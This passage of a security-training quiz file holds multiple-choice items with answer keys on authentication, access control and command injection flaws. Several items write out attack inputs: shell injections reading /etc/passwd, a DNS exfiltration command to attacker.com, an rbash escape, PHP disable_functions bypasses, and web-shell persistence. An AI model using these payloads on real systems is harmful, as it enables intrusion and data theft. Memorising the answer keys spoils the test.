+      - c: "Brute-force the 6-digit TOTP code — there are only 1,000,000 possibilities and the code changes every 30 seconds"
+      - d: "Modify the 2FA verification response in a proxy to change the result from 'failed' to 'success' and proceed"
+    answer: "b"
+    explanation: "A common flaw is that the server grants a partially-authenticated session after the password step, and some endpoints don't verify that 2FA was actually completed. The attacker simply skips the /2fa-verify step and accesses other pages directly. Option A requires the attacker to have intercepted a valid code in real-time, which assumes a much stronger position. Option C won't work because even at 1 attempt per second, 1,000,000 possibilities in 30 seconds is impossible, and rate limiting would apply. Option D only works if authentication state is tracked client-side (in a cookie or token), which is a different vulnerability — most implementations use server-side session state."
+
+  - id: auth-007
+    topic: authentication
+    type: spot-the-vuln
+    difficulty: intermediate
+    question: "Consider this password reset code:\n```python\ntoken = secrets.token_hex(32)\nreset_tokens[token] = {'user': email, 'expires': time.time() + 600}\n# Later, during verification:\nif request.args['token'] in reset_tokens:\n    if reset_tokens[request.args['token']]['expires'] > time.time():\n        allow_reset()\n        # BUG: token not deleted here\n```\nWhat is the security impact of the marked bug?"
+    options:
+      - a: "Token reuse — the reset token remains valid until expiry, allowing anyone who intercepts it to reset the password multiple times or even after the user has already reset it"
+      - b: "Memory exhaustion — accumulated tokens will eventually crash the server"
+      - c: "No real impact — the token expires after 10 minutes anyway, so the window is already small"
+      - d: "Race condition — two concurrent requests could both pass the check and reset the password to different values"
+    answer: "a"
+    explanation: "The token should be invalidated immediately after use (single-use). Without deletion, if an attacker intercepts the token (from email logs, browser history, referrer headers), they can use it even after the legitimate user has already reset their password — potentially locking the user out or taking over the account repeatedly within the 10-minute window. Option B is negligible — a few tokens don't cause memory issues. Option C dramatically understates the risk — 10 minutes is a long window for token reuse attacks. Option D is a real concern but secondary to the primary token-reuse vulnerability."
+
+  - id: auth-008
+    topic: authentication
+    type: tricky-concept
+    difficulty: advanced
+    question: "A developer implements constant-time string comparison for password verification: `hmac.compare_digest(submitted_hash, stored_hash)`. But they hash the password BEFORE this comparison using `hashlib.sha256(password).hexdigest()`. Is there still a timing vulnerability?"
+    options:
+      - a: "Yes — sha256 takes different amounts of time depending on input length, leaking information about the expected password length"
+      - b: "No — the constant-time comparison is the critical defense, and the hashing step doesn't leak useful information because the attacker already knows what they submitted"
+      - c: "Yes — sha256's output length varies based on input, so the comparison operates on different-length strings"
+      - d: "No — but the approach is flawed because they should use bcrypt instead of sha256 for password hashing"
+    answer: "b"
+    explanation: "The timing of the hash operation doesn't leak useful information because the attacker already knows their own input and its length. The critical timing leak would be in the comparison step, which is properly protected by compare_digest. Option A is wrong — while sha256 technically processes different numbers of blocks for different input lengths, this doesn't leak information about the STORED password. Option C is wrong — sha256 always produces a fixed-length output (64 hex characters). Option D identifies a real best-practice issue (sha256 is too fast for passwords) but answers a different question than what was asked."
+
+  - id: auth-009
+    topic: authentication
+    type: scenario
+    difficulty: advanced
+    question: "You're testing an API that uses JWTs with the 'kid' (Key ID) header parameter to select which key to verify the signature against. Keys are fetched from a database. What is the MOST dangerous attack vector?"
+    options:
+      - a: "SQL injection via the kid parameter — if the server uses the kid value directly in a database query to look up the signing key"
+      - b: "Setting kid to point to a predictable static file (like /dev/null or an empty file) so the verification key is empty or null"
+      - c: "Brute-forcing kid values to find a weak or test key that was accidentally left in the key database"
+      - d: "Setting kid to a URL pointing to an attacker's server that returns a key the attacker controls"
+    answer: "a"
+    explanation: "If the kid parameter is used in a SQL query without parameterization (e.g., `SELECT key FROM keys WHERE id = '$kid'`), an attacker can inject SQL to return an arbitrary value as the key, then sign the JWT with that known value. This gives complete token forgery. Option B is real but requires knowledge of the server's file system and that it falls back to file-based lookup. Option C is possible but slow and noisy. Option D depends on the server fetching remote keys based on kid, which is unusual for database-backed key stores."
+
+  - id: auth-010
+    topic: authentication
+    type: defense-bypass
+    difficulty: intermediate
+    question: "A site prevents brute force by locking accounts after 5 failed attempts. What is the MOST effective attack strategy that avoids triggering the lockout?"
+    options:
+      - a: "Password spraying — try one common password against thousands of accounts, then try the next password, staying under 5 attempts per account"
+      - b: "Credential stuffing from a breach database — these are known-valid credentials so they're less likely to trigger lockout"
+      - c: "Wait for the lockout timer to expire between each batch of 5 attempts and continue"
+      - d: "Use a CAPTCHA solver to bypass the lockout mechanism which typically uses CAPTCHA as its enforcement"
+    answer: "a"
+    explanation: "Password spraying inverts the brute-force approach: instead of many passwords against one account, you try one password against many accounts. Each account sees at most 1-2 attempts, far below the lockout threshold. With common passwords like 'Password1!' the hit rate is surprisingly high. Option B is effective but is a different attack category — and it still triggers lockout if the stolen credentials are outdated. Option C works but is extremely slow and the account holder may notice repeated lockouts. Option D incorrectly assumes lockout is CAPTCHA-based — account lockout is typically separate from CAPTCHA."
+
+  - id: auth-011
+    topic: authentication
+    type: scenario
+    difficulty: advanced
+    question: "A password reset endpoint accepts email addresses and always responds with 'If an account exists, a reset link has been sent.' to prevent user enumeration. However, an attacker can STILL enumerate accounts. What is the MOST reliable method?"
+    options:
+      - a: "Measure response times — the server takes slightly longer when it actually generates and sends an email versus when it doesn't"
+      - b: "Try to register new accounts with those email addresses — the registration form may disclose whether the email is already taken"
+      - c: "Check for differences in HTTP response headers (Set-Cookie, Cache-Control) between existing and non-existing accounts"
+      - d: "Analyze the response body character by character for invisible differences like extra whitespace or hidden fields"
+    answer: "a"
+    explanation: "Even with identical response messages, the server-side processing differs: for valid accounts, it generates a token, queries the database, composes an email, and calls an SMTP server — all of which take measurable time. For invalid accounts, it returns almost immediately. This timing side-channel is extremely common. Option B is a real enumeration vector but targets the registration endpoint, not the password reset. Option C is occasionally possible but most frameworks standardize headers. Option D is very unlikely — templating engines produce consistent output."
+
+  - id: auth-012
+    topic: authentication
+    type: tricky-concept
+    difficulty: advanced
+    question: "An application sets a session cookie with these flags: `Secure; HttpOnly; SameSite=Lax; Path=/`. Under which scenario can an attacker still steal this session cookie?"
+    options:
+      - a: "Via a subdomain takeover — if an abandoned subdomain can be claimed, cookies set without a Domain attribute are still accessible to parent domain subdomains"
+      - b: "Via XSS — HttpOnly only prevents document.cookie access, but XMLHttpRequest and fetch() can still read the cookie header from responses"
+      - c: "Via a man-in-the-middle attack on the same domain over HTTP — the Secure flag doesn't apply if the attacker is on the same network"
+      - d: "Via a browser extension or malicious browser — cookie flags are only enforced by standards-compliant browsers"
+    answer: "d"
+    explanation: "Cookie security flags are enforced by the browser. A malicious browser extension with appropriate permissions or a compromised browser can access any cookie regardless of flags. All cookie protections assume a trustworthy user agent. Option A is wrong — cookies set WITHOUT a Domain attribute are actually MORE restrictive: they're only sent to the exact origin that set them (not subdomains). This is the opposite of what the option claims. Option B is wrong — HttpOnly prevents all JavaScript access to the cookie, including reading it from response headers via XHR/fetch. Option C is wrong — the Secure flag prevents the cookie from being sent over any non-HTTPS connection, regardless of network position."
+
+  # ============================================================
+  # ACCESS CONTROL (12 questions)
+  # ============================================================
+
+  - id: ac-001
+    topic: access-control
+    type: tricky-concept
+    difficulty: intermediate
+    question: "A developer uses UUIDs (v4) for object references instead of sequential IDs, arguing this prevents IDOR. Why is this an insufficient defense?"
+    options:
+      - a: "UUID v4 has only 2^64 bits of entropy which is brute-forceable with modern GPU clusters"
+      - b: "UUIDs may leak through application logs, URLs, API responses, referrer headers, or browser history — obscurity is not access control"
+      - c: "UUID v4 generation is predictable if the attacker knows the server's random seed"
+      - d: "UUIDs are transmitted as strings which can be manipulated more easily than integer IDs"
+    answer: "b"
+    explanation: "UUIDs are security through obscurity — they make guessing harder but don't enforce authorization. UUIDs leak through many channels: they appear in URLs (shared/bookmarked), API responses (listing endpoints), logs, referrer headers when clicking external links, and browser history. Once known, they provide the same access as sequential IDs. Option A is wrong — UUID v4 has 122 random bits, which IS infeasible to brute-force. Option C is wrong — UUID v4 uses cryptographically secure random generators, not predictable seeds. Option D is irrelevant — string vs integer format has no bearing on authorization."
+
+  - id: ac-002
+    topic: access-control
+    type: scenario
+    difficulty: advanced
+    question: "An API uses a PUT endpoint: `PUT /api/users/{id}` which accepts JSON to update user profiles. The API only expects `{\"name\": \"...\", \"email\": \"...\"}`. An attacker sends `{\"name\": \"...\", \"role\": \"admin\"}`. What vulnerability class is this?"
+    options:
+      - a: "Mass assignment (also called auto-binding) — the framework automatically binds all JSON fields to the user model, including privileged fields like role"
+      - b: "Parameter pollution — the extra field causes the API to process duplicate parameters with undefined behavior"
+      - c: "IDOR — the attacker is modifying their own profile but adding fields that belong to a different authorization scope"
+      - d: "Server-side request forgery — the role field could trigger an internal API call to the authorization service"
+    answer: "a"
+    explanation: "Mass assignment occurs when frameworks (Rails, Django, Express with body-parser, etc.) automatically bind ALL incoming JSON/form fields to the data model. If 'role' is a field on the User model and there's no explicit allowlist, the framework blindly updates it. Option B describes HTTP parameter pollution which involves duplicate parameter names, not extra fields. Option C is wrong — IDOR is about accessing OTHER users' resources, not elevating your own privileges. Option D is incorrect — adding a JSON field doesn't trigger SSRF."
+
+  - id: ac-003
+    topic: access-control
+    type: defense-bypass
+    difficulty: advanced
+    question: "A REST API implements role-based access control (RBAC) with middleware that checks permissions on every endpoint. The middleware uses pattern matching: `/api/admin/*` requires admin role. Which request might bypass this?"
+    options:
+      - a: "`GET /api/admin/../admin/users` — path traversal confuses the pattern matcher into not recognizing the admin path"
+      - b: "`GET /api/Admin/users` — case-sensitive pattern matching fails on the different case, but the router is case-insensitive"
+      - c: "`GET /api/admin/users.json` — adding a file extension bypasses the wildcard pattern"
+      - d: "`GET /api/admin%2fusers` — URL-encoded slash bypasses the middleware pattern but is decoded by the backend router"
+    answer: "b"
+    explanation: "If the RBAC middleware uses case-sensitive matching (`/api/admin/*`) but the underlying router handles routes case-insensitively, then `/api/Admin/users` bypasses the check but still routes to the admin endpoint. This is a classic case normalization mismatch. Option A is typically handled — most middleware frameworks normalize path traversal sequences before matching. Option C is wrong — `*` wildcards typically match everything including dots and extensions. Option D is plausible but most frameworks normalize URL encoding before routing, so this is less reliable than case mismatch."
+
+  - id: ac-004
+    topic: access-control
+    type: attack-chain
+    difficulty: intermediate
+    question: "You discover that a regular user can access `GET /api/admin/users` which lists all users with their email addresses. The endpoint correctly returns 403 for POST/PUT/DELETE requests. What is the MOST impactful thing you can do with this information?"
+    options:
+      - a: "Harvest the user list for targeted phishing or credential stuffing attacks against the admin accounts"
+      - b: "Use the email addresses to enumerate password reset tokens for each user"
+      - c: "Nothing impactful — read-only access to a user list is an informational finding, not exploitable"
+      - d: "Leverage the user IDs from the listing to attempt IDOR attacks against other endpoints that may not properly validate authorization"
+    answer: "d"
+    explanation: "The user listing likely exposes internal user IDs, which can be used to probe other API endpoints for IDOR vulnerabilities. Endpoints like `/api/users/{id}/documents`, `/api/users/{id}/payment-methods` might have their own authorization flaws. Option A is useful but is an indirect attack that requires additional steps. Option B makes an incorrect leap — knowing emails doesn't help enumerate reset tokens. Option C significantly underestimates the risk — information disclosure is often the first step in a chain. Option D represents the most direct technical escalation path."
+
+  - id: ac-005
+    topic: access-control
+    type: scenario
+    difficulty: advanced
+    question: "An e-commerce site displays order history for the logged-in user at `/orders?user_id=123`. Changing user_id to 124 shows another user's orders. The developer adds a server-side check: `if request.params['user_id'] != session.user_id: return 403`. Is this fix complete?"
+    options:
+      - a: "Yes — the fix ensures the user can only access their own orders by validating the user_id matches the session"
+      - b: "No — the user_id parameter is now redundant and should be removed entirely; the server should always use session.user_id to fetch orders"
+      - c: "No — the check should use type-safe comparison (=== in JavaScript) because '123' != 123 would incorrectly deny access"
+      - d: "No — the fix only works for GET requests; the attacker could still modify orders via PUT/DELETE with a different user_id"
+    answer: "b"
+    explanation: "The fundamental flaw is that the endpoint accepts a user ID from the client when it already has the authenticated user's identity in the session. The correct fix is to remove the user_id parameter entirely and always use `session.user_id` to determine whose orders to fetch. This eliminates the IDOR class of vulnerability by design rather than adding validation. Option A is wrong because keeping the parameter at all is an unnecessary attack surface. Option C raises a real concern but it's a secondary implementation detail, not the primary issue. Option D is valid but is a separate endpoint concern."
+
+  - id: ac-006
+    topic: access-control
+    type: tricky-concept
+    difficulty: intermediate
+    question: "What is the key difference between horizontal and vertical privilege escalation? An attacker has a regular user account."
+    options:
+      - a: "Horizontal: accessing another regular user's data. Vertical: accessing admin functionality. Both exploit missing authorization checks but at different levels."
+      - b: "Horizontal: exploiting multiple vulnerabilities in sequence. Vertical: exploiting a single vulnerability to gain elevated access."
+      - c: "Horizontal: attacks that work across different pages. Vertical: attacks that work within a single page's functionality."
+      - d: "Horizontal: accessing resources at the same API path. Vertical: accessing resources at a different API path that requires higher privileges."
+    answer: "a"
+    explanation: "Horizontal escalation means accessing resources of users at the same privilege level (user A reading user B's data). Vertical escalation means gaining access to higher-privilege functionality (regular user accessing admin features). Option B incorrectly redefines these as attack complexity metrics. Option C incorrectly maps them to page-level scope. Option D incorrectly ties them to API path structure — the path isn't what determines the escalation type; the privilege level required is."
+
+  - id: ac-007
+    topic: access-control
+    type: defense-bypass
+    difficulty: advanced
+    question: "An application uses an API gateway that enforces authorization. Direct access to backend microservices is supposed to be blocked by network rules. An attacker discovers an SSRF vulnerability in one of the services. How does this bypass access control?"
+    options:
+      - a: "SSRF from within the trusted network bypasses the API gateway entirely — internal service-to-service calls typically skip authorization because they trust the network boundary"
+      - b: "SSRF lets the attacker modify the API gateway's configuration to disable authorization checks"
+      - c: "SSRF allows the attacker to steal the API gateway's TLS certificates, enabling man-in-the-middle attacks on the gateway"
+      - d: "SSRF lets the attacker reach the authorization database directly and modify their own permissions"
+    answer: "a"
+    explanation: "In microservice architectures, the API gateway often handles all authentication/authorization, and internal services trust requests from within the network. SSRF from any internal service can directly call other internal services without going through the gateway, completely bypassing all authorization checks. Option B is possible but unlikely — API gateway configurations are typically not accessible via arbitrary HTTP calls. Option C is wrong — SSRF doesn't enable TLS certificate theft in any straightforward way. Option D is possible but requires the authorization database to be accessible via HTTP, which is unusual."
+
+  - id: ac-008
+    topic: access-control
+    type: scenario
+    difficulty: advanced
+    question: "A GraphQL API has a query like `user(id: ID!) { name, email, role }`. The resolver checks that the requesting user can only query their own data. However, the schema also exposes `order(id: ID!) { items, user { name, email, role } }`. What vulnerability exists?"
+    options:
+      - a: "The order resolver may not implement the same authorization checks — an attacker can access any user's data by querying through the order's nested user relationship"
+      - b: "GraphQL introspection reveals the schema, allowing the attacker to discover hidden admin-only fields"
+      - c: "The attacker can use GraphQL aliases to bypass rate limiting and brute-force user IDs through the user query"
+      - d: "The nested query depth causes exponential database queries, enabling a denial-of-service attack"
+    answer: "a"
+    explanation: "This is a classic GraphQL authorization bypass via nested resolvers. Even if the `user` query resolver enforces access control, the `user` field resolver on the Order type may not have its own authorization checks. The attacker queries `order(id: 'any-order-id') { user { name, email, role } }` to read other users' data via a different resolution path. Option B describes information disclosure, not access control bypass. Option C describes a different attack (brute-force). Option D describes a resource exhaustion attack, not an authorization bypass."
+
+  - id: ac-009
+    topic: access-control
+    type: spot-the-vuln
+    difficulty: intermediate
+    question: "Consider this Express.js middleware:\n```javascript\napp.use('/admin', (req, res, next) => {\n  if (req.user.role !== 'admin') return res.status(403).send('Forbidden');\n  next();\n});\n```\nA non-admin user accesses `/Admin/dashboard` and gets through. What happened?"
+    options:
+      - a: "Express.js route matching is case-insensitive by default, but the middleware path string is matched case-sensitively before being passed to Express's router"
+      - b: "The app.use() middleware is only applied to exact path matches, not prefix matches like `/admin/dashboard`"
+      - c: "Express.js treats middleware paths case-sensitively by default, so `/Admin` doesn't match `/admin`, but route handlers may match case-insensitively depending on configuration"
+      - d: "The !== comparison fails because req.user.role is undefined for non-admin users, which doesn't strictly not-equal 'admin'"
+    answer: "c"
+    explanation: "Express.js app.use() does case-sensitive path matching by default. The request to `/Admin/dashboard` doesn't match the `/admin` middleware, so the authorization check is skipped entirely. However, if the downstream route handler or static file serving is case-insensitive (common on Windows or with certain configurations), the request still resolves successfully. Option A gets the behavior backwards. Option B is wrong — app.use() IS a prefix match, but that's not the issue here. Option D is wrong — if req.user.role were undefined, `undefined !== 'admin'` evaluates to true, which would correctly block access."
+
+  - id: ac-010
+    topic: access-control
+    type: defense-bypass
+    difficulty: advanced
+    question: "A REST API checks admin access by verifying a `role` field in the JWT. An attacker can't forge JWTs but discovers the `/api/users/me` endpoint allows PATCH requests. They send `PATCH /api/users/me` with `{\"role\": \"admin\"}`. The API returns 200 but their JWT still shows `role: user`. Is the attack successful?"
+    options:
+      - a: "No — the JWT role wasn't updated, so authorization checks using the JWT will still fail"
+      - b: "Yes — but only after the JWT expires and a new one is issued using the updated database role"
+      - c: "No — PATCH on /users/me only updates display fields, never authorization fields"
+      - d: "Yes — immediately, because the server re-reads the role from the database on each request, not from the JWT"
+    answer: "b"
+    explanation: "If the PATCH successfully updated the role in the database (indicated by the 200 response), the attack succeeds once a new JWT is issued — typically at next login or token refresh. The current JWT is stale but JWTs are usually short-lived. Option A is temporarily correct but misses the long-term impact. Option C makes an assumption about field filtering that the 200 response contradicts. Option D depends on the architecture — the question states the API checks the JWT's role field, meaning it doesn't query the database on every request."
+
+  - id: ac-011
+    topic: access-control
+    type: scenario
+    difficulty: intermediate
+    question: "An API endpoint `/api/documents/{id}` returns documents. Users should only see their own. The developer implements: `SELECT * FROM documents WHERE id = :id AND owner_id = :current_user`. A tester bypasses this. How?"
+    options:
+      - a: "SQL injection in the :id parameter to comment out the AND clause"
+      - b: "The query is correct — the tester must be exploiting a different endpoint that doesn't have the owner check"
+      - c: "HTTP parameter pollution: sending `id=1&owner_id=999` to override the current_user variable"
+      - d: "Using a PUT/PATCH request to change the document's owner_id to their own, then accessing it with GET"
+    answer: "b"
+    explanation: "The query pattern is correct and secure for THIS endpoint. The most likely bypass is through a different endpoint — perhaps `/api/documents/search`, `/api/documents/shared`, an export feature, or a GraphQL resolver that accesses the same documents without the owner check. Security requires consistent authorization across ALL access paths. Option A is wrong because :id uses parameterized query notation. Option C is wrong — server-side variables like :current_user come from the session, not from request parameters. Option D is a different attack against a write endpoint, not a bypass of this read query."
+
+  - id: ac-012
+    topic: access-control
+    type: tricky-concept
+    difficulty: advanced
+    question: "A multi-tenant SaaS application uses row-level security (RLS) in PostgreSQL. All queries automatically filter by `tenant_id = current_setting('app.tenant_id')`. The app sets this per-request from the authenticated session. Under what condition does this STILL fail?"
+    options:
+      - a: "If a SQL injection vulnerability exists that allows SET commands: `'; SET app.tenant_id = 'other-tenant'; SELECT * FROM ...`"
+      - b: "RLS is always secure because it's enforced at the database engine level, below the application"
+      - c: "If the application has any endpoint that uses a database connection pool and fails to set the tenant_id before executing queries, inheriting the previous request's tenant context"
+      - d: "If a superuser role is used for the application's database connection, since RLS policies are bypassed for superusers by default"
+    answer: "d"
+    explanation: "PostgreSQL's RLS is bypassed entirely by superuser roles and table owners by default. If the application connects as a superuser (which is a common misconfiguration), all RLS policies are ignored. You must use `FORCE ROW LEVEL SECURITY` and connect as a non-owner role. Option A is concerning but requires SQL injection, which is a separate vulnerability class. Option B is dangerously wrong — RLS has several bypass conditions. Option C describes a real implementation risk with connection pooling, but proper pool management (resetting settings on connection checkout) addresses this, and it's less fundamental than the superuser bypass."
+
+  # ============================================================
+  # COMMAND INJECTION (12 questions)
+  # ============================================================
+
+  - id: cmdi-001
+    topic: command-injection
+    type: tricky-concept
+    difficulty: advanced
+    question: "A developer uses Python's `subprocess.call(['ping', '-c', '1', user_input])` instead of `os.system('ping -c 1 ' + user_input)`. The user provides `8.8.8.8; cat /etc/passwd`. What happens?"
+    options:
+      - a: "The command injection succeeds in both cases — subprocess.call still passes the argument through a shell"
+      - b: "The subprocess.call version is safe because the array form bypasses the shell entirely — the semicolon and command are passed as a literal argument to ping"
+      - c: "The subprocess.call version is safe only on Linux — on Windows, the array form still uses cmd.exe which interprets semicolons"
+      - d: "The subprocess.call version is vulnerable because ping itself interprets the semicolon and executes the second command"
+    answer: "b"
+    explanation: "When subprocess.call is given a list, it calls the executable directly via execvp (no shell involved). The entire string `8.8.8.8; cat /etc/passwd` is passed as a single argument to ping, which doesn't know what to do with it and returns an error. Option A is wrong — the key benefit of list form is bypassing the shell. Option C is partially correct about Windows having edge cases with certain executables, but subprocess with a list still doesn't invoke cmd.exe by default on Windows. Option D is wrong — ping is not a shell and doesn't interpret command separators."
+
+  - id: cmdi-002
+    topic: command-injection
+    type: defense-bypass
+    difficulty: advanced
+    question: "A web app passes user input to a shell command but filters semicolons (;), pipes (|), ampersands (&), and backticks (`). Which technique MOST reliably achieves command injection?"
+    options:
+      - a: "Use newline character (%0a) as a command separator — it works identically to a semicolon in most shells and is commonly overlooked in filters"
+      - b: "Use $() command substitution syntax — it's functionally equivalent to backticks but uses different characters"
+      - c: "Use the shell's command grouping with curly braces: `{ cat /etc/passwd; }` to execute commands"
+      - d: "Use double-pipe (||) for conditional execution: `invalid_input || cat /etc/passwd` — || is different from single |"
+    answer: "a"
+    explanation: "Newline (%0a) is the most commonly overlooked command separator. In bash/sh, a newline is equivalent to a semicolon for separating commands. Filters that block common command separators almost never account for it. Option B is good but $() still contains parentheses which might be filtered or cause syntax issues depending on the injection context. Option C still uses semicolons internally, which are blocked. Option D might work if || isn't filtered, but it requires the preceding command to fail, which depends on context."
+
+  - id: cmdi-003
+    topic: command-injection
+    type: scenario
+    difficulty: advanced
+    question: "You've confirmed blind command injection — the server doesn't return output, and outbound network connections are blocked by a firewall. How can you extract data?"
+    options:
+      - a: "Use time-based extraction: `if [ $(cat /etc/passwd | cut -c1) = 'r' ]; then sleep 5; fi` — infer data character by character from response delays"
+      - b: "Write command output to a file in the web root: `cat /etc/passwd > /var/www/html/output.txt` — then retrieve it via HTTP"
+      - c: "Use DNS exfiltration: `dig $(cat /etc/passwd | base64).attacker.com` — the DNS query will leak data through the firewall"
+      - d: "Redirect command output to the HTTP response using: `cat /etc/passwd >&2` which sends data to the web server's error output"
+    answer: "a"
+    explanation: "Time-based extraction works purely through observable timing differences, requiring no outbound connectivity. You test each character position one by one, measuring the response time to determine the value. Option B requires knowing the web root path and having write permissions — possible but less universal. Option C is clever but the question states outbound network connections are blocked — DNS queries are network traffic and may also be blocked (though many firewalls do allow DNS). Option D misunderstands how stderr works — it doesn't automatically appear in HTTP responses."
+
+  - id: cmdi-004
+    topic: command-injection
+    type: tricky-concept
+    difficulty: advanced
+    question: "What is the critical difference between ARGUMENT injection and COMMAND injection? Consider: `git clone $user_url`."
+    options:
+      - a: "They are the same thing — both inject additional commands into a shell"
+      - b: "Argument injection manipulates the arguments of the EXISTING command (e.g., `--upload-pack=malicious`) without injecting new commands, while command injection breaks out to run entirely separate commands"
+      - c: "Command injection works only with interpreted languages, while argument injection works with compiled binaries"
+      - d: "Argument injection only affects help text and usage output, while command injection achieves code execution"
+    answer: "b"
+    explanation: "With `git clone $user_url`, even if shell metacharacters are properly escaped (preventing command injection), an attacker can provide `--upload-pack='malicious_command'` as the URL. Git processes this as a valid command-line argument, which can achieve code execution through Git's own features — no shell breakout needed. Option A incorrectly conflates two distinct vulnerability classes. Option C is wrong — both attacks are language-agnostic. Option D drastically understates argument injection — many programs have arguments that lead to file writes, code execution, or information disclosure."
+
+  - id: cmdi-005
+    topic: command-injection
+    type: defense-bypass
+    difficulty: intermediate
+    question: "A web app blocks spaces in user input to prevent command injection. The backend runs bash. Which approach executes `cat /etc/passwd` without using spaces?"
+    options:
+      - a: "`cat</etc/passwd` — input redirection operator doesn't need spaces"
+      - b: "`cat${IFS}/etc/passwd` — the IFS variable defaults to space/tab/newline and expands without a literal space"
+      - c: "`cat%20/etc/passwd` — URL encoding of the space character bypasses the filter"
+      - d: "All of A and B work; C only works if the filter runs before URL decoding"
+    answer: "d"
+    explanation: "Option A works because bash allows input redirection immediately after a command without spaces. Option B works because $IFS (Internal Field Separator) defaults to whitespace and is expanded by bash. Option C depends on whether the space filter runs on the URL-decoded or raw input — if the filter checks after URL decoding, %20 becomes a space and is caught. All three are valid space-bypass techniques in different contexts."
+
+  - id: cmdi-006
+    topic: command-injection
+    type: scenario
+    difficulty: advanced
+    question: "You find command injection in a PHP application but the server has `disable_functions` set to block exec(), system(), passthru(), shell_exec(), and proc_open(). How can you STILL achieve OS command execution?"
+    options:
+      - a: "Use mail() with the -X flag in the additional_parameters argument to write arbitrary content to files, then include it as PHP code"
+      - b: "Use PHP's FFI (Foreign Function Interface) to call libc's system() directly, bypassing the disable_functions list"
+      - c: "Use putenv() to inject a malicious LD_PRELOAD library that gets loaded when any child process starts"
+      - d: "All of these are viable bypass techniques depending on the PHP version and configuration"
+    answer: "d"
+    explanation: "All three are real disable_functions bypasses. Option A: mail()'s fifth parameter passes arguments to sendmail, and -X writes log files, enabling PHP code injection. Option B: FFI (PHP 7.4+) provides direct access to C functions, completely bypassing disable_functions. Option C: LD_PRELOAD combined with mail() forces the loaded sendmail process to load an attacker-controlled shared library. Each depends on specific configurations — mail() requires sendmail, FFI requires enablement, and LD_PRELOAD requires putenv() to not be disabled."
+
+  - id: cmdi-007
+    topic: command-injection
+    type: spot-the-vuln
+    difficulty: intermediate
+    question: "Consider this Node.js code:\n```javascript\nconst { exec } = require('child_process');\nconst filename = req.query.file.replace(/[;&|`$()]/g, '');\nexec(`file ${filename}`, callback);\n```\nThe developer filtered common shell metacharacters. What injection vector remains?"
+    options:
+      - a: "Newline injection (%0a) — newlines are command separators in bash but aren't in the filter regex"
+      - b: "The filter is comprehensive — no command injection is possible with these characters blocked"
+      - c: "Double-encoding the semicolon (%253B) bypasses the regex because it only checks decoded characters"
+      - d: "Template literal injection via ${} — but wait, those are already filtered by the regex"
+    answer: "a"
+    explanation: "The regex filters many dangerous characters but misses newline (\\n / %0a), which bash interprets as a command separator identical to semicolons. Input like `harmless%0acat%20/etc/passwd` would execute both commands. Option B incorrectly assumes the filter is complete. Option C is wrong — the regex runs on the already-decoded query string value from the Express.js framework. Option D correctly notes that $() is filtered but confuses JavaScript template literals with shell command substitution (and acknowledges they're filtered anyway)."
+
+  - id: cmdi-008
+    topic: command-injection
+    type: attack-chain
+    difficulty: advanced
+    question: "You've achieved command execution on a Linux web server running as the www-data user. The server has no compiler (gcc/cc), no wget/curl, and the outbound firewall blocks all ports except 53 (DNS) and 443 (HTTPS). What is the MOST effective way to establish persistence?"
+    options:
+      - a: "Use Python (commonly available on Linux) to create an HTTPS reverse shell to port 443, bypassing the firewall"
+      - b: "Write a cron job for www-data that periodically checks a DNS TXT record for commands to execute using built-in tools like dig or nslookup"
+      - c: "Modify the web application's source code to include a web shell — it persists through reboots and uses existing HTTP traffic"
+      - d: "Use /dev/tcp (bash built-in) to create a reverse connection over port 443"
+    answer: "c"
+    explanation: "Modifying the existing web application to include a web shell is the most reliable persistence method: it survives reboots, uses the existing HTTP/HTTPS traffic (no additional outbound connections), and www-data likely has write access to the web root. Option A is good but requires python and creates an additional network connection that could be detected. Option B is creative but cron jobs may not be available for www-data, and DNS-based C2 is noisy. Option D is clever but /dev/tcp is only available in bash compiled with network support, and it creates a detectable outbound connection."
+
+  - id: cmdi-009
+    topic: command-injection
+    type: tricky-concept
+    difficulty: intermediate
+    question: "In a shell command like `find /uploads -name $filename -type f`, why is the injection risk different from `echo $filename`?"
+    options:
+      - a: "find has its own expression language — an attacker could inject `-exec cat /etc/passwd {} ;` as the filename, which find would process as a valid argument rather than needing shell metacharacter injection"
+      - b: "find runs as root by default, so the impact is higher, but the injection mechanism is the same"
+      - c: "find sanitizes its arguments internally, making it less vulnerable than echo"
+      - d: "There is no difference — both commands process $filename identically through the shell"
+    answer: "a"
+    explanation: "This is argument injection, not command injection. The `find` command has built-in expressions like `-exec` that execute arbitrary commands. An attacker can inject `-exec cat /etc/passwd {} ;` as the filename without any shell metacharacters. Even if shell metacharacters are properly escaped, find's own argument processing creates the vulnerability. Option B is wrong — find runs as the current user, not root. Option C is wrong — find doesn't sanitize arguments. Option D misses the critical difference between shell-level and program-level argument interpretation."
+
+  - id: cmdi-010
+    topic: command-injection
+    type: scenario
+    difficulty: advanced
+    question: "A restricted shell (rbash) prevents you from using /, changing directories, or modifying PATH. You have command injection but within this restricted context. What is the MOST reliable escape technique?"
+    options:
+      - a: "Use programming interpreters available in PATH: `python -c 'import os; os.system(\"/bin/bash\")'` — the child process isn't restricted"
+      - b: "Use shell built-ins to change the PATH: `export PATH=/usr/bin:$PATH` — built-ins aren't subject to rbash restrictions"
+      - c: "Use `ed` or `vi` to spawn an unrestricted shell via their command execution features (:!bash or !bash)"
+      - d: "Both A and C work — any method that spawns a new shell process from within an allowed program escapes the restriction"
+    answer: "d"
+    explanation: "Restricted shells only restrict the current shell session. Any program that can spawn a child process (python, perl, vi, ed, awk, find, nmap, etc.) can launch an unrestricted shell. Both Python interpreter execution and vi/ed command execution are valid escapes. Option B is wrong — rbash specifically prevents modifying PATH, changing directories, and using / in commands via export. The key insight is that rbash restrictions don't propagate to child processes spawned by allowed programs."
+
+  - id: cmdi-011
+    topic: command-injection
+    type: defense-bypass
+    difficulty: advanced
+    question: "An application uses an allowlist to validate user input, only permitting alphanumeric characters and dots (for IP addresses): `^[a-zA-Z0-9.]+$`. The input is passed to `ping`. What attack is STILL possible?"
+    options:
+      - a: "DNS rebinding — provide a domain name like `evil.attacker.com` (all alphanumeric and dots) that resolves to an internal IP address"
+      - b: "Command injection via encoding — alphanumeric-only payloads exist for bash command execution"
+      - c: "The alphanumeric+dot filter is airtight — no OS command injection or meaningful abuse is possible"
+      - d: "Integer overflow — a very long string of digits causes ping to access memory beyond its buffer"
+    answer: "a"
